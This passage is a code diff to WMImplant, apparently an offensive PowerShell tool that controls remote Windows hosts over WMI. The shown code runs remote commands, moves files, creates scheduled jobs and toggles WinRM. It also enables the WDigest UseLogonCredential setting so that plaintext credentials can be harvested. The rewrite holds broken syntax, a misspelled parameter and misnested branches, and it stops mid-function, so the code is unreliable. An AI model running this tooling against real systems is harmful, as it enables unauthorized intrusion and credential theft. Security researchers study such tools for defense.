@@ -214,12 +214,12 @@ function Enable-WinRMWMI
         if($Creds)
         {
             Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
-            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $DWORDName -RegData 1 -Target $Target -Creds $Creds
+            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $DWORDName -RegValue 1 -Target $Target -Creds $Creds
         }
         else 
         {
             Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target
-            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $DWORDName -RegData 1 -Target $Target
+            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $DWORDName -RegValue 1 -Target $Target
         }
 
         Write-Verbose 'Attempting to start WinRM'
@@ -236,14 +236,14 @@ function Enable-WinRMWMI
         if($Creds)
         {
             Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
-            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule1Name -RegData $Rule1Value -Target $Target -Creds $Creds
-            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule2Name -RegData $Rule2Value -Target $Target -Creds $Creds
+            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule1Name -RegValue $Rule1Value -Target $Target -Creds $Creds
+            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule2Name -RegValue $Rule2Value -Target $Target -Creds $Creds
         }
         else 
         {
             Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target
-            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule1Name -RegData $Rule1Value -Target $Target
-            Invoke-RegValueMod -RegMethod create -RegHive hklm -RegKey $Key -RegValue $Rule2Name -RegData $Rule2Value -Target $Target
+            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule1Name -RegValue $Rule1Value -Target $Target
+            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule2Name -RegValue $Rule2Value -Target $Target
         }
 
         # Restarting firewall service
@@ -963,11 +963,11 @@ function Invoke-CommandGeneration
         {
             if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
-                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command = "`nInvoke-WMImplant -command registry_mod -KeyDelete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
             }
             else
             {
-                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $GenTarget`n"
+                $Command = "`nInvoke-WMImplant -command registry_mod -KeyDelete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $GenTarget`n"
             }
             $Command
         }
@@ -989,11 +989,11 @@ function Invoke-CommandGeneration
         {
             if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
-                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '1' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command = "`nInvoke-WMImplant -command registry_mod -KeyCreate -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue '1' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
             }
             else
             {
-                $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '1' -Target $GenTarget`n"
+                $Command = "`nInvoke-WMImplant -command registry_mod -KeyCreate -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue '1' -Target $GenTarget`n"
             }
             $Command
         }
@@ -1026,11 +1026,11 @@ function Invoke-CommandGeneration
                     $GenRegData = Read-Host "What's the data you'd like to modify? >"
                     if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
-                        $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -RegData $GenRegData -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                        $Command = "`nInvoke-WMImplant -command registry_mod -KeyCreate -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -RegValue $GenRegData -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                     }
                     else
                     {
-                        $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -RegData $GenRegData -Target $GenTarget`n"
+                        $Command = "`nInvoke-WMImplant -command registry_mod -KeyCreate -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -RegValue $GenRegData -Target $GenTarget`n"
                     }
                 }
 
@@ -1038,11 +1038,11 @@ function Invoke-CommandGeneration
                 {
                     if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
-                        $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                        $Command = "`nInvoke-WMImplant -command registry_mod -KeyDelete -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
                     }
                     else
                     {
-                        $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -Target $GenTarget`n"
+                        $Command = "`nInvoke-WMImplant -command registry_mod -KeyDelete -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -Target $GenTarget`n"
                     }
                 }
             }
@@ -1426,7 +1426,11 @@ function Invoke-JobMod
         [Parameter(Mandatory = $False)] 
         [string]$Target,
         [Parameter(Mandatory = $False)]
-        [string]$JobAction,
+        [switch]$CreateJob,
+        [Parameter(Mandatory = $False)]
+        [switch]$ListJobs,
+        [Parameter(Mandatory = $False)]
+        [switch]$DeleteJob,
         [Parameter(Mandatory = $False)]
         [string]$JobId,
         [Parameter(Mandatory = $False)]
@@ -1454,82 +1458,79 @@ function Invoke-JobMod
             $JobAction = $JobAction.Trim().ToLower()
         }
 
-        switch ($JobAction)
+        if($ListJobs)
         {
-            "list"
+            if($Creds)
             {
-                if($Creds)
-                {
-                    $jobs = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Credential $Creds
-                }
-                else
-                {
-                    $jobs = Get-WmiObject -class win32_scheduledjob -ComputerName $Target
-                }
-
-                foreach($job in $jobs)
-                {
-                    if($job -ne $null)
-                    {
-                        $job
-                        Write-Output "Start Time: " $job.StartTime
-                    }
-                    else
-                    {
-                        Write-Output "No jobs currently scheduled"
-                    }
-                }
+                $jobs = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Credential $Creds
+            }
+            else
+            {
+                $jobs = Get-WmiObject -class win32_scheduledjob -ComputerName $Target
             }
 
-            "delete"
+            foreach($job in $jobs)
             {
-                if(!$JobId)
+                if($job -ne $null)
                 {
-                    $JobId = Read-Host "What is the job ID of the job you'd like to delete? >"
-                    $JobId = $JobId.Trim()
-                }
-
-                Write-Verbose "Deleting job $JobId"
-
-                if($Creds)
-                {
-                    $job = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Credential $Creds -Filter "jobID = $JobId"
+                    $job
+                    Write-Output "Start Time: " $job.StartTime
                 }
                 else
                 {
-                    $job = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Filter "jobID = $JobId"
+                    Write-Output "No jobs currently scheduled"
                 }
+            }
+        }
 
-                $job.delete()
-                Write-Verbose "Job $JobId has been removed"                
+        elseif($DeleteJob)
+        {
+            if(!$JobId)
+            {
+                $JobId = Read-Host "What is the job ID of the job you'd like to delete? >"
+                $JobId = $JobId.Trim()
             }
 
-            "create"
+            Write-Verbose "Deleting job $JobId"
+
+            if($Creds)
             {
-                if(!$JobProcess)
-                {
-                    $JobProcess = Read-Host "What is the full path to the file you'd like to start with a job? >"
-                    $JobProcess = $JobProcess.Trim()
-                }
+                $job = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Credential $Creds -Filter "jobID = $JobId"
+            }
+            else
+            {
+                $job = Get-WmiObject -class win32_scheduledjob -ComputerName $Target -Filter "jobID = $JobId"
+            }
 
-                if(!$Time)
-                {
-                    $Time = Read-Host "What time do you want this to execute? (Ex: 14:04) >"
-                    $Time = $Time.Trim()
-                }
+            $job.delete()
+            Write-Verbose "Job $JobId has been removed"                
+        }
 
-                Write-Verbose "Creating job on remote system"
-                $wmi_sched_job = [wmiclass]"\\$env:computername\root\cimv2:win32_scheduledjob"
-                $Time = $wmi_sched_job.ConvertFromDateTime($Time)
+        elseif($CreateJob)
+        {
+            if(!$JobProcess)
+            {
+                $JobProcess = Read-Host "What is the full path to the file you'd like to start with a job? >"
+                $JobProcess = $JobProcess.Trim()
+            }
 
-                if($Creds)
-                {
-                    (Get-WmiObject -list win32_scheduledjob -ComputerName $Target -Credential $Creds).Create($JobProcess,$Time)
-                }
-                else
-                {
-                    (Get-WmiObject -list win32_scheduledjob -ComputerName $Target).Create($JobProcess,$Time)
-                }
+            if(!$Time)
+            {
+                $Time = Read-Host "What time do you want this to execute? (Ex: 14:04) >"
+                $Time = $Time.Trim()
+            }
+
+            Write-Verbose "Creating job on remote system"
+            $wmi_sched_job = [wmiclass]"\\$env:computername\root\cimv2:win32_scheduledjob"
+            $Time = $wmi_sched_job.ConvertFromDateTime($Time)
+
+            if($Creds)
+            {
+                (Get-WmiObject -list win32_scheduledjob -ComputerName $Target -Credential $Creds).Create($JobProcess,$Time)
+            }
+            else
+            {
+                (Get-WmiObject -list win32_scheduledjob -ComputerName $Target).Create($JobProcess,$Time)
             }
         }
     }
@@ -1744,15 +1745,17 @@ function Invoke-RegValueMod
         [Parameter(Mandatory = $False)]
         [string]$Target,
         [Parameter(Mandatory = $False)] 
-        [string]$RegMethod,
+        [switch]$KeyCreate,
+        [Parameter(Mandatory = $False)] 
+        [switch]$KeyDelete,
         [Parameter(Mandatory = $False)] 
         [string]$RegHive,
         [Parameter(Mandatory = $False)] 
         [string]$RegKey,
         [Parameter(Mandatory = $False)] 
-        [string]$RegValue,
+        [string]$RegSubKey,
         [Parameter(Mandatory = $False)] 
-        [string]$RegData
+        [string]$RegValue
     )
 
     Process
@@ -1806,56 +1809,53 @@ function Invoke-RegValueMod
             $RegKey = Read-Host "What's the registry key you'd like to modify? Ex: SOFTWARE\Microsoft\Windows >"
         }
 
-        if(!$RegValue)
+        if(!$RegSubKey)
         {
-            $RegValue = Read-Host "What's the registry value you'd like to modify? Ex: WMImplantInstalled >"
+            $RegSubKey = Read-Host "What's the registry Sub Key you'd like to modify? Ex: WMImplantInstalled >"
         }
 
-        switch($RegMethod)
+        if($KeyCreate)
         {
-            "create"
+            if(!$RegValue)
             {
-                if(!$RegData)
-                {
-                    $RegData = Read-Host "What's the data you'd like for the registry value being modified? >"
-                }
+                $RegValue = Read-Host "What's the data you'd like for the registry value being modified? >"
+            }
 
-                if($Creds)
+            if($Creds)
+            {
+                if($RegValue -eq "UseLogonCredential" -or $RegValue -eq "AllowAutoConfig") 
                 {
-                    if($RegValue -eq "UseLogonCredential" -or $RegValue -eq "AllowAutoConfig") 
-                    {
-                        Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegValue, 1) -ComputerName $Target -Credential $Creds
-                    }
-                    else
-                    {
-                        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegData, $RegValue -ComputerName $Target -Credential $Creds
-                    }
+                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $Target -Credential $Creds
                 }
-
                 else
                 {
-                    if($RegValue -eq "UseLogonCredential" -or $RegValue -eq "AllowAutoConfig")
-                    {
-                        Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegValue, 1) -ComputerName $Target
-                    }
-                    else
-                    {
-                        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegData, $RegValue -ComputerName $Target
-                    }
+                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegSubKey, $RegValue -ComputerName $Target -Credential $Creds
                 }
             }
 
-            "delete"
+            else
             {
-                if($Creds)
+                if($RegValue -eq "UseLogonCredential" -or $RegValue -eq "AllowAutoConfig")
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegValue -ComputerName $Target -Credential $Creds
+                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $Target
                 }
-
                 else
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegValue -ComputerName $Target
+                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList $hivevalue, $RegKey, $RegSubKey, $RegValue -ComputerName $Target
                 }
+            }
+        }
+
+        elseif($KeyDelete)
+        {
+            if($Creds)
+            {
+                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $Target -Credential $Creds
+            }
+
+            else
+            {
+                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $Target
             }
         }
     }
@@ -2258,11 +2258,11 @@ function Invoke-WMImplant
     This command authenticates to "theboss" system under the current user's context, and creates a job that runs notepad.exe at 14:45.
     
     .EXAMPLE
-    > Invoke-WMImplant -Command registry_mod -RegMethod create -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegValue ChrisTest -RegData "True" -Target win7user -RemoteUser test\chris -RemotePass pass123
+    > Invoke-WMImplant -Command registry_mod -KeyCreate -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest -RegValue "True" -Target win7user -RemoteUser test\chris -RemotePass pass123
     This command authenticates to the win7user system using the provided credentials and creates the ChrisTest value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM
 
     .EXAMPLE
-    > Invoke-WMImplant -command registry_mod -RegMethod delete -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegValue ChrisTest2 -Target Win7user4
+    > Invoke-WMImplant -command registry_mod -KeyDelete -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest2 -Target Win7user4
     This command authenticates as the current user to the win7user4 system and delete's the ChrisTest2 value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM
     #>
 
@@ -2273,13 +2273,13 @@ function Invoke-WMImplant
         [string]$Command,
         [Parameter(Mandatory = $False)]
         [string]$ListCommands,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))]
+        [Parameter(Mandatory = $False)]
         [string]$RemoteUser,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))]
+        [Parameter(Mandatory = $False)]
         [string]$RemotePass,
         [Parameter(Mandatory = $False, ParameterSetName='Delete Job')]
         [string]$RemoteID,
-        [Parameter(Mandatory = $False, ParameterSetName='Download File')],
+        [Parameter(Mandatory = $False, ParameterSetName='Download File')]
         [Parameter(ParameterSetName='Upload File')]
         [Parameter(ParameterSetName='Logon Events')]
         [string]$LocalFile,
@@ -2290,6 +2290,12 @@ function Invoke-WMImplant
         [Parameter(ParameterSetName='Process Start')]
         [Parameter(ParameterSetName='Job Create')]
         [string]$RemoteFile,
+        [Parameter(Mandatory = $False, ParameterSetName='List Jobs')]
+        [switch]$ListJobs,
+        [Parameter(Mandatory = $False, ParameterSetName='Job Create')]
+        [switch]$CreateJob,
+        [Parameter(Mandatory = $False, ParameterSetName='Delete Job')]
+        [switch]$DeleteJob,
         [Parameter(ParameterSetName='Directory Listing')]
         [string]$RemoteDirectory,
         [Parameter(Mandatory = $False, ParameterSetName='File Search Name')]
@@ -2299,930 +2305,990 @@ function Invoke-WMImplant
         [string]$RemoteExtension,
         [Parameter(Mandatory = $False, ValueFromPipeLine=$True)]
         [string]$Target,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))]
-        [string]$Url,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))]
+        [Parameter(Mandatory = $False, ParameterSetName='Remote PowerShell')]
         [string]$Function,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))]
+        [Parameter(Mandatory = $False, ParameterSetName='Process Kill Name')]
         [string]$ProcessName,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))]
+        [Parameter(Mandatory = $False, ParameterSetName='Process Kill ID')]
         [string]$ProcessID,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))]
-        [string]$JobAction,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))]
+        [Parameter(Mandatory = $False, ParameterSetName='Service Start')]
+        [Parameter(ParameterSetName='Service Stop')]
+        [Parameter(ParameterSetName='Service Create')]
+        [Parameter(ParameterSetName='Service Delete')]
         [string]$ServiceName,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))]
-        [string]$ServiceAction,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))]
+        [Parameter(Mandatory = $False, ParameterSetName='Service Start')]
+        [switch]$ServiceStart,
+        [Parameter(Mandatory = $False, ParameterSetName='Service Stop')]
+        [switch]$ServiceStop,
+        [Parameter(Mandatory = $False, ParameterSetName='Service Create')]
+        [switch]$ServiceCreate,
+        [Parameter(Mandatory = $False, ParameterSetName='Service Delete')]
+        [switch]$ServiceDelete,
+        [Parameter(Mandatory = $False, ParameterSetName='Create Scheduled Job')]
         [string]$Time,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))] 
-        [string]$RegMethod,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))] 
-        [string]$RegHive,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))] 
+        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
+        [Parameter(ParameterSetName='Delete Reg Key')]
         [string]$RegKey,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))] 
+        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
+        [Parameter(ParameterSetName='Delete Reg Key')]
+        [string]$RegSubKey,
+        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
         [string]$RegValue,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))] 
-        [string]$RegData,
-        [Parameter(Mandatory = $False, ParameterSetName='id'))] 
-        [string]$RemoteCommand
+        [Parameter(Mandatory = $False, ParameterSetName='Command Execution')] 
+        [string]$RemoteCommand,
+        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
+        [switch]$KeyCreate,
+        [Parameter(Mandatory = $False, ParameterSetName='Delete Reg Key')]
+        [switch]$KeyDelete,
+        [Parameter(Mandatory = $False, ParameterSetName='Read File')]
+        [switch]$Cat,
+        [Parameter(Mandatory = $False, ParameterSetName='Download File')]
+        [switch]$Download,
+        [Parameter(Mandatory = $False, ParameterSetName='Directory Listing')]
+        [switch]$LS,
+        [Parameter(Mandatory = $False, ParameterSetName='File Search Name')]
+        [Parameter(ParameterSetName='File Search Extension')]
+        [switch]$Search,
+        [Parameter(ParameterSetName='Upload File')]
+        [switch]$Upload,
+        [Parameter(ParameterSetName='Command Execution')]
+        [switch]$CommandExec,
+        [Parameter(ParameterSetName='Disable WDigest')]
+        [switch]$DisableWdigest,
+        [Parameter(ParameterSetName='Disable WinRM')]
+        [switch]$DisableWinRM,
+        [Parameter(ParameterSetName='Enable WDigest')]
+        [switch]$EnableWdigest,
+        [Parameter(ParameterSetName='Enable WinRM')]
+        [switch]$EnableWinRM,
+        [Parameter(Mandatory = $False, ParameterSetName='Create Reg Key')]
+        [Parameter(ParameterSetName='Delete Reg Key')]
+        [string]$RegHive,
+        [Parameter(ParameterSetName='Remote PowerShell')]
+        [switch]$RemotePosh,
     )
 
     Process
     {
-        if($Command)
+        # Create the remote credential object that will be needed for EVERYTHING
+        if($RemoteUser -and $RemotePass)
         {
-            # Create the remote credential object that will be needed for EVERYTHING
-            if($RemoteUser -and $RemotePass)
+            $RemotePassword = ConvertTo-SecureString $RemotePass -asplaintext -force 
+            $RemoteCredential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $RemoteUser,$RemotePassword
+        }
+
+        if($Cat)
+        {
+            if(!$Target)
             {
-                $RemotePassword = ConvertTo-SecureString $RemotePass -asplaintext -force 
-                $RemoteCredential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $RemoteUser,$RemotePassword
+                Throw "You need to specify a target to run the command against!"
             }
 
-            switch ($Command.Trim().ToLower())
+            if(!$RemoteFile)
             {
-                "cat"
+                Throw "You need to specify a file to read with the RemoteFile flag!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
                 {
-                    if(!$Target)
+                    Get-FileContentsWMImplant -Creds $RemoteCredential -Target $Computer -File $RemoteFile
+                }
+
+                else
+                {
+                    Get-FileContentsWMImplant -Target $Computer -File $RemoteFile
+                }
+            }
+        }
+
+        elseif($Download)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$RemoteFile)
+            {
+                Throw "You need to specify a file to read with the RemoteFile flag!"
+            }
+
+            if(!$LocalFile)
+            {
+                Throw "You need to specify the location to save the file with the $LocalFile flag!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-FileTransferWMImplant -Creds $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
+                }
+
+                else
+                {
+                    Invoke-FileTransferWMImplant -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
+                }
+            }
+        }
+
+        elseif($LS)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$RemoteFile)
+            {
+                Throw "Please provide the RemoteFile parameter to specify the directory to list!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-LSWMImplant -Creds $RemoteCredential -Target $Computer -Directory $RemoteFile
+                }
+
+                else
+                {
+                    Invoke-LSWMImplant -Target $Computer -Directory $RemoteFile
+                }
+            }
+        }
+
+        elseif($Search)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$RemoteFile -and !$RemoteExtension)
+            {
+                Throw "Please provide the RemoteFile or RemoteExtension parameter to specify the file or extension to search for!"
+            }
+
+            if(!$RemoteDrive)
+            {
+                Throw "Please provide the RemoteDrive parameter to specify the drive to search!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    if($RemoteFile)
                     {
-                        Throw "You need to specify a target to run the command against!"
+                        Find-FileWMImplant -Creds $RemoteCredential -File $RemoteFile -Target $Computer -Drive $RemoteDrive
+                    }
+                    elseif($RemoteExtension)
+                    {
+                        Find-FileWMImplant -Creds $RemoteCredential -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
+                    }
+                }
+
+                else
+                {
+                    if($RemoteFile)
+                    {
+                        Find-FileWMImplant -File $RemoteFile -Target $Computer -Drive $RemoteDrive
+                    }
+                    elseif($RemoteExtension)
+                    {
+                        Find-FileWMImplant -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
+                    }
+                }
+            }
+        }
+
+        elseif($Upload)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$LocalFile)
+            {
+                Throw "Please use the LocalFile flag to specify the file to upload!"
+            }
+
+            if(!$RemoteFile)
+            {
+                Throw "Please use the RemoteFile flag to specify the full path to upload the file to!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-FileTransferWMImplant -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer
+                }
+
+                else
+                {
+                    Invoke-FileTransferWMImplant -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer
+                }
+            }
+        }
+
+        elseif($CommandExec)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$RemoteCommand)
+            {
+                Throw "You need to specify the command to run with the -Command!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-CommandExecution -Creds $RemoteCredential -ExecCommand $RemoteCommand -Target $Computer
+                }
+
+                else
+                {
+                    Invoke-CommandExecution -Target $Computer -ExecCommand $RemoteCommand
+                }
+            }
+        }
+
+        elseif($DisableWDigest)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-RegValueMod -Creds $RemoteCredential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $Computer
+                }
+
+                else
+                {
+                    Invoke-RegValueMod -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $Computer
+                }
+            }
+        }
+
+        elseif($DisableWinRM)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
+                }
+
+                else
+                {
+                    Invoke-ProcSpawn -Target $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
+                }
+            }
+        }
+
+        elseif($EnableWdigest)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-RegValueMod -Creds $RemoteCredential -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $Computer
+                }
+
+                else
+                {
+                    Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $Computer
+                }
+            }
+        }
+
+        elseif($EnableWinRM)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
+                }
+
+                else
+                {
+                    Invoke-ProcSpawn -Target $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
+                }
+            }
+        }
+
+        elseif($KeyCreate)
+        {
+            if(!$Target)
+            {
+                Throw "You need to specify a target to run the command against!"
+            }
+
+            if(!$KeyCreate) -and (!$KeyDelete)
+            {
+                Throw "You need to specify if you want to create or delete a string registry value!"
+            }
+
+            if(!$RegHive)
+            {
+                Throw "You need to specify either [hklm] or [hkcu] for the registry value to use!"
+            }
+
+            if(!$RegKey)
+            {
+                Throw "You need to specify the registry key you will add or remove a value from!"
+            }
+
+            if(!$RegValue)
+            {
+                Throw "Please provide the registry value you are looking to modify!"
+            }
+
+            Foreach($Computer in $Target)
+            {
+                if($RemoteCredential)
+                {
+                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegValue -RegValue $RegValue
+                }
+                else
+                {
+                    Invoke-RegValueMod -Target $Computer -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegValue -RegValue $RegValue
+                }
+            }
+
+            elseif($KeyDelete)
+            {
+                Foreach($Computer in $Target)
+                {
+                    if($RemoteCredential)
+                    {
+                        Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegValue
+                    }
+                    else
+                    {
+                        Invoke-RegValueMod -Target $Computer -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegValue
+                    }
+                }
+            }
+        }
+
+        elseif($KeyDelete)
+        {
+            if(!$Target)
+            {
